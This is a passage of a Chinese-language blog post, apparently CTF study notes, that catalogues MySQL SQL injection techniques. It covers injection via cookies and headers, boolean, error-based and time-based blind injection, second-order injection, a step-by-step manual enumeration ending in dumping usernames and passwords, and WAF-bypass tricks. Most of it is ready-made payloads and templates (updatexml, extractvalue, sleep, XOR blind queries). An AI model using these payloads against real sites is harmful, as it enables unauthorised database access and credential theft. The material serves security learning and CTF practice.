<h4 id="Cookies"><a href="#Cookies" class="headerlink" title="Cookies"></a>Cookies</h4><p>当php会通过cookies中username等字段进行查询时可能存在注入,与POST基本一致,只是注入位置的区别</p>
<h5 id="head中"><a href="#head中" class="headerlink" title="head中"></a>head中</h5><ul>
<li><p>User-Agent</p>
</li>
<li><p>Referer</p>
</li>
<li><p>XFF(X-Forward-For)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forward-For：127.0.0.1&#39; select 1,2,user()</span><br></pre></td></tr></table></figure>
<p>当php会将ip,User-Agent,referer等请求头信息进行存储数据库时,可能存在注入,与POST基本一致,只是注入位置的区别,可以通过浏览器插件、浏览器编辑和重发的功能、抓包等对请求头进行更改</p>
</li>
</ul>
<h3 id="按从服务器接收到的响应"><a href="#按从服务器接收到的响应" class="headerlink" title="按从服务器接收到的响应"></a>按从服务器接收到的响应</h3><h4 id="显错注入"><a href="#显错注入" class="headerlink" title="显错注入"></a>显错注入</h4><p>由于php代码会将mysql中的错误展示在前端，所以很好判断，参考上方GET等</p>
<h4 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h4><h5 id="基于bool"><a href="#基于bool" class="headerlink" title="基于bool"></a>基于bool</h5><ul>
<li><p>▲left(database(),1)&gt;’s’ //left()函数</p>
<p>Explain:</p>
<ul>
<li>database()显示数据库名称</li>
<li>left(a,b)从左侧截取 a 的前 b 位</li>
</ul>
</li>
<li><p>▲ascii(substr((select table_name information_schema.tables where tables_schema</p>
<p>=database()limit 0,1),1,1))=101 –+ //substr()函数，ascii()函数</p>
<p>Explain：</p>
<ul>
<li><p>substr(a,b,c)从 b 位置开始，截取字符串 a 的 c 长度。</p>
</li>
<li><p>ascii()将某个字符转换为 ascii 值</p>
</li>
<li><p>ascii(substr((select database()),1,1))=98（改变第一个</p>
<p>1</p>
<p>和98的值相当于将名字一个个和字母比较，从而得到完整名字）</p>
<ul>
<li>也可以用二分法和&gt;=’a’,between and等来判断</li>
</ul>
</li>
</ul>
</li>
<li><p>▲ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER</p>
<p>BY id LIMIT 0,1),1,1))&gt;98%23 //ORD()函数，MID()函数</p>
<p>Explain：</p>
<ul>
<li>mid(a,b,c)从位置 b 开始，截取 a 字符串的 c 位</li>
<li>Ord()函数同 ascii()，将字符转为 ascii 值</li>
</ul>
</li>
<li><p>▲regexp 正则注入</p>
<p>正则注入介绍：</p>
<p><a target="_blank" rel="noopener" href="http://www.cnblogs.com/lcamry/articles/5717442.html">http://www.cnblogs.com/lcamry/articles/5717442.html</a></p>
<p>用法介绍：select user() regexp ‘^[a-z]’;</p>
<p>Explain：</p>
<ul>
<li>正则表达式的用法，user()结果为 root，regexp 为匹配 root 的正则表达式。第二位可以用 select user() regexp ‘^ro’来进行。</li>
</ul>
</li>
</ul>
<h5 id="基于报错"><a href="#基于报错" class="headerlink" title="基于报错"></a>基于报错</h5><p>———————————构造payload 让信息通过错误提示回显出来——————</p>
<ul>
<li><p>select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2)) a from information_schema.columns group by a;<br>Explain:此处有三个点，</p>
<ul>
<li>一是需要 concat 计数，</li>
<li>二是 floor，取得 0 or 1，进行数据的重复，</li>
<li>三是 group by 进行分组，但具体原理解释不是很通，大致原理为分组后数据计数时<br>重复造成的错误。也有解释为 mysql 的 bug 的问题。</li>
<li>但是此处需要将 rand(0)，rand()需<br>要多试几次才行。</li>
<li>以上语句可以简化成如下的形式。<br>select count(*) from information_schema.tables group by concat(version(),floor(rand(0)*2))</li>
<li>如果 rand 被禁用了可以使用用户变量来报错<br>select min(@a:=1) from information_schema.tables group by concat(password,@a:=(@a+1)%2)</li>
</ul>
</li>
<li><p>select exp(~(select * FROM(SELECT USER())a)) //double 数值类型超出范围<br>//Exp()为以 e 为底的对数函数；版本在 5.5.5 及其以上<br>可以参考 exp 报错文章：<a target="_blank" rel="noopener" href="http://www.cnblogs.com/lcamry/articles/5509124.html">http://www.cnblogs.com/lcamry/articles/5509124.html</a></p>
</li>
<li><p>select !(select * from (select user())x) -（ps:这是减号） <del>0<br>//bigint 超出范围；</del>0 是对 0 逐位取反，很大的版本在 5.5.5 及其以上</p>
<p>可以参考文章 bigint 溢出文章 <a target="_blank" rel="noopener" href="http://www.cnblogs.com/lcamry/articles/5509112.html">http://www.cnblogs.com/lcamry/articles/5509112.html</a></p>
</li>
<li><p>extractvalue(1,concat(0x7e,(select @@version),0x7e))</p>
<p>//mysql 对 xml 数据进行查询和修改的 xpath 函数，xpath 语法错误,32位字符限制</p>
</li>
<li><p>updatexml(1,concat(0x7e,(select @@version),0x7e),1)</p>
<p>//mysql 对 xml 数据进行查询和修改的 xpath 函数，xpath 语法错误,32位字符限制</p>
</li>
<li><p>select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;<br>//mysql 重复特性，此处重复了 version，所以报错</p>
</li>
</ul>
<h6 id="报错注入总结和示例"><a href="#报错注入总结和示例" class="headerlink" title="报错注入总结和示例"></a>报错注入总结和示例</h6><ul>
<li>floor()和rand()</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select count(*),2,concat(&#39;:&#39;,(select database()),&#39;:&#39;,floor(rand()*2))as a from information_schema.tables group by a       &#x2F;*利用错误信息得到当前数据库名*&#x2F;</span><br></pre></td></tr></table></figure>
<ul>
<li>extractvalue()</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)))</span><br></pre></td></tr></table></figure>
<ul>
<li>updatexml()</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1))</span><br></pre></td></tr></table></figure>
<ul>
<li>geometrycollection()</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1 and geometrycollection((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>
<ul>
<li>multipoint()</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1 and multipoint((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>
<ul>
<li>polygon()</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1 and polygon((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>
<ul>
<li>multipolygon()</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1 and multipolygon((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>
<ul>
<li>linestring()</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1 and linestring((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>
<ul>
<li>multilinestring()</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1 and multilinestring((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>
<ul>
<li>exp()</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1 and exp(~(select * from(select user())a))</span><br></pre></td></tr></table></figure>
<h5 id="基于时间"><a href="#基于时间" class="headerlink" title="基于时间"></a>基于时间</h5><ul>
<li>If(ascii(substr(database(),1,1))&gt;115,0,sleep(5))%23 //if 判断语句， 条件为假，执行 sleep<br>Ps： 遇到以下这种利用 sleep()延时注入语句<br>select sleep(find_in_set(mid(@@version, 1, 1), ‘0,1,2,3,4,5,6,7,8,9,.’));<br>该语句意思是在 0-9 之间找版本号的第一位。 但是在我们实际渗透过程中， 这种用法是不可取的，因为时间会有网速等其他因素的影响，所以会影响结果的判断。</li>
<li>UNION SELECT IF(SUBSTRING(current,1,1)=CHAR(119),BENCHMARK(5000000,ENCODE(‘MSG’,’by 5 seconds’)),null) FROM (select database() as current) as tb1;<br>//BENCHMARK(count,expr)用于测试函数的性能，参数一为次数，二为要执行的表达式。可以让函数执行若干次，返回结果比平时要长，通过时间长短的变化，判断语句是否执行成功。这是一种边信道攻击，在运行过程中占用大量的 cpu 资源。推荐使用 sleep()</li>
</ul>
<h4 id="堆叠查询注入"><a href="#堆叠查询注入" class="headerlink" title="堆叠查询注入"></a>堆叠查询注入</h4><p><strong>局限性</strong></p>
<p>堆叠注入的局限性在于并不是每一个环境下都可以执行， 可能受到 API 或者数据库引擎不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序</p>
<p><strong>原理</strong></p>
<p>利用分号结束一句执行,从而构造多行语句进行注入攻击</p>
<h2 id="按注入的程度和顺序"><a href="#按注入的程度和顺序" class="headerlink" title="按注入的程度和顺序"></a>按注入的程度和顺序</h2><h3 id="一阶注入"><a href="#一阶注入" class="headerlink" title="一阶注入"></a>一阶注入</h3><p>即直接注入，查看上述所有</p>
<h3 id="二阶注入（二次注入）"><a href="#二阶注入（二次注入）" class="headerlink" title="二阶注入（二次注入）"></a>二阶注入（二次注入）</h3><p>1、黑客通过构造数据的形式，在浏览器或者其他软件中提交 HTTP 数据报文请求到服务<br>端进行处理，提交的数据报文请求中可能包含了黑客构造的 SQL 语句或者命令。</p>
<p>2、服务端应用程序会将黑客提交的数据信息进行存储， 通常是保存在数据库中， 保存的<br>数据信息的主要作用是为应用程序执行其他功能提供原始输入数据并对客户端请求做出响<br>应。</p>
<p>3、黑客向服务端发送第二个与第一次不相同的请求数据信息。</p>
<p>4、服务端接收到黑客提交的第二个请求信息后， 为了处理该请求， 服务端会查询数据库<br>中已经存储的数据信息并处理， 从而导致黑客在第一次请求中构造的 SQL 语句或者命令在服<br>务端环境中执行。</p>
<p>5、服务端返回执行的处理结果数据信息， 黑客可以通过返回的结果数据信息判断二次注<br>入漏洞利用是否成功。<br>例：</p>
<p>先注册一个 admin’#的账号，接下来登录该帐号后进行修改密码。此时修改的就是 admin 的密码。<br>Sql 语句变为 UPDATE users SET passwd=”New_Pass” WHERE username =’ admin’ # ‘ AND<br>password=’ ， 也 就 是 执 行 了 UPDATE users SET passwd=”New_Pass” WHERE username =’<br>admin’</p>
<h2 id="0x03-基本手工注入流程"><a href="#0x03-基本手工注入流程" class="headerlink" title="0x03 基本手工注入流程"></a>0x03 基本手工注入流程</h2><p>要从select语句中获得有用的信息，必须确定该数据库中的字段数和那个字段能够输出，这是前提。</p>
<h3 id="1、MySQL-gt-5-0"><a href="#1、MySQL-gt-5-0" class="headerlink" title="1、MySQL &gt;= 5.0"></a>1、MySQL &gt;= 5.0</h3><h4 id="（1）获取字段数"><a href="#（1）获取字段数" class="headerlink" title="（1）获取字段数"></a>（1）获取字段数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">order by n  &#x2F;*通过不断尝试改变n的值来观察页面反应确定字段数*&#x2F;</span><br></pre></td></tr></table></figure>
<h4 id="（2）获取系统数据库名"><a href="#（2）获取系统数据库名" class="headerlink" title="（2）获取系统数据库名"></a>（2）获取系统数据库名</h4><p>在MySQL &gt;5.0中，数据库名存放在information_schema数据库下schemata表schema_name字段中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select null,null,schema_name from information_schema.schemata</span><br></pre></td></tr></table></figure>
<h4 id="（3）获取当前数据库名"><a href="#（3）获取当前数据库名" class="headerlink" title="（3）获取当前数据库名"></a>（3）获取当前数据库名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select null,null,...,database()</span><br></pre></td></tr></table></figure>
<h4 id="（4）获取数据库中的表"><a href="#（4）获取数据库中的表" class="headerlink" title="（4）获取数据库中的表"></a>（4）获取数据库中的表</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select null,null,...,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()</span><br></pre></td></tr></table></figure>
<p>或</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select null,null,...,table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1</span><br></pre></td></tr></table></figure>
<h4 id="（5）获取表中的字段"><a href="#（5）获取表中的字段" class="headerlink" title="（5）获取表中的字段"></a>（5）获取表中的字段</h4><p>这里假设已经获取到表名为user</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select null,null,...,group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;users&#39;</span><br></pre></td></tr></table></figure>
<h4 id="（6）获取各个字段值"><a href="#（6）获取各个字段值" class="headerlink" title="（6）获取各个字段值"></a>（6）获取各个字段值</h4><p>这里假设已经获取到表名为user，且字段为username和password</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select null,group_concat(username,password) from users</span><br></pre></td></tr></table></figure>
<h3 id="2、MySQL-lt-5-0"><a href="#2、MySQL-lt-5-0" class="headerlink" title="2、MySQL &lt; 5.0"></a>2、MySQL &lt; 5.0</h3><p>MySQL &lt; 5.0 没有信息数据库<strong>information_schema</strong>，所以只能手工枚举爆破（二分法思想）。</p>
<p>该方式通常用于盲注。</p>
<h3 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h3><p><strong>length(str)</strong> ：返回字符串str的长度</p>
<p><strong>substr(str, pos, len)</strong> ：将str从pos位置开始截取len长度的字符进行返回。注意这里的pos位置是从1开始的，不是数组的0开始</p>
<p><strong>mid(str,pos,len)</strong> ：跟上面的一样，截取字符串</p>
<p><strong>ascii(str)</strong> ：返回字符串str的最左面字符的ASCII代码值</p>
<p><strong>ord(str)</strong> ：将字符或布尔类型转成ascll码</p>
<p><strong>if(a,b,c)</strong> ：a为条件，a为true，返回b，否则返回c，如if(1&gt;2,1,0),返回0</p>
<h4 id="（1）基于布尔的盲注"><a href="#（1）基于布尔的盲注" class="headerlink" title="（1）基于布尔的盲注"></a>（1）基于布尔的盲注</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and ascii(substr((select database()),1,1))&gt;64 &#x2F;*判断数据库名的第一个字符的ascii值是否大于64*&#x2F;</span><br></pre></td></tr></table></figure>
<h4 id="（2）基于时间的盲注"><a href="#（2）基于时间的盲注" class="headerlink" title="（2）基于时间的盲注"></a>（2）基于时间的盲注</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1 union select if(SUBSTRING(user(),1,4)&#x3D;&#39;root&#39;,sleep(4),1),null,null &#x2F;*提取用户名前四个字符做判断，正确就延迟4秒，错误返回1*&#x2F;</span><br></pre></td></tr></table></figure>
<h2 id="0x04SQL注入绕过技术"><a href="#0x04SQL注入绕过技术" class="headerlink" title="0x04SQL注入绕过技术"></a>0x04SQL注入绕过技术</h2><ul>
<li><p><strong>大小写绕过</strong></p>
</li>
<li><p><strong>双写绕过</strong></p>
</li>
<li><p><strong>编码绕过</strong>（url全编码、十六进制）</p>
</li>
<li><p><strong>内联注释绕过</strong></p>
</li>
<li><p><strong>关键字替换</strong></p>
<ul>
<li><p><strong>逗号绕过</strong></p>
<p>substr、mid()函数中可以利用from to来摆脱对逗号的利用；</p>
<p>limit中可以利用offset来摆脱对逗号的利用</p>
</li>
<li><p><strong>比较符号( &gt;、&lt; )绕过</strong>（greatest、between and)</p>
</li>
<li><p><strong>逻辑符号的替换</strong>（and=&amp;&amp; or=|| xor=| not=!）</p>
</li>
<li><p><strong>空格绕过</strong>（用括号，+等绕过）</p>
</li>
</ul>
</li>
<li><p><strong>等价函数绕过</strong></p>
<ul>
<li>hex()、bin()=ascii()</li>
<li>concat_ws()=group_concat()</li>
<li>mid()、substr()=substring()</li>
</ul>
</li>
<li><p><strong>http参数污染</strong></p>
<p><code>id=1 union select+1,2,3+from+users+where+id=1–</code></p>
<p>变为</p>
<p><code>id=1 union select+1&amp;id=2,3+from+users+where+id=1–</code></p>
</li>
<li><p><strong>缓冲区溢出绕过</strong></p>
<p>(id=1 and (select 1)=(Select 0xAAAAAAAAAAAAAAAAAAAAA)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 ,27,28,29,30,31,32,33,34,35,36–+</p>
<p>其中0xAAAAAAAAAAAAAAAAAAAAA这里A越多越好。。一般会存在临界值，其实这种方法还对后缀名的绕过也有用)</p>
</li>
<li><p>不用or and 来进行bool盲注</p>
<p>原理</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1^1^1</span><br><span class="line">&#x3D;&gt;id&#x3D;1</span><br></pre></td></tr></table></figure>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1^(ord(substr((select(group_concat(schema_name))from(information_schema.schemata)),&#123;0&#125;,1))&#x3D;&#123;1&#125;)^1&quot;</span><br><span class="line">#爆库</span><br><span class="line">1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)&#x3D;&#39;geek&#39;),%s,1))&#x3D;%s)^1</span><br><span class="line">#爆字段</span><br></pre></td></tr></table></figure></li>
</ul>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="reward-container">
  <div>Buy me a coffee</div>
  <button onclick="document.querySelector('.post-reward').classList.toggle('active');">
    Donate
  </button>
  <div class="post-reward">
      <div>
        <img src="/images/wechatpay.png" alt="D15h35 WeChat Pay">
        <span>WeChat Pay</span>
      </div>
      <div>
        <img src="/images/alipay.jpg" alt="D15h35 Alipay">
        <span>Alipay</span>
      </div>

  </div>
</div>

          <div class="post-tags">
              <a href="/tags/CTF/" rel="tag"><i class="fa fa-tag"></i> CTF</a>
              <a href="/tags/sql/" rel="tag"><i class="fa fa-tag"></i> sql</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2020/01/16/Note/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%8C%82%E8%B5%B7%E6%97%A0%E6%B3%95%E6%81%A2%E5%A4%8D/" rel="prev" title="虚拟机挂起无法恢复">
                  <i class="fa fa-chevron-left"></i> 虚拟机挂起无法恢复
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2020/02/25/CTF_WP/gyctf_wp/" rel="next" title="GYCTF——2020i春秋新春战疫CTF——网络安全公益赛">
                  GYCTF——2020i春秋新春战疫CTF——网络安全公益赛 <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>







<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      const activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      const commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>
</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 2018 – 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">D15h35</span>
</div>
<div class="busuanzi-count">
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
  </div>

    </div>
  </footer>

  
  <script src="//cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script>
<script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>

  
<script src="/js/local-search.js"></script>





  <script>
    NProgress.configure({
      showSpinner: true
    });
    NProgress.start();
    document.addEventListener('readystatechange', () => {
      if (document.readyState === 'interactive') {
        NProgress.inc(0.8);
      }
      if (document.readyState === 'complete') {
        NProgress.done();
      }
    });
    document.addEventListener('pjax:send', () => {
      NProgress.start();
    });
    document.addEventListener('pjax:success', () => {
      NProgress.done();
    });
  </script>

  
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>





</body>
</html>
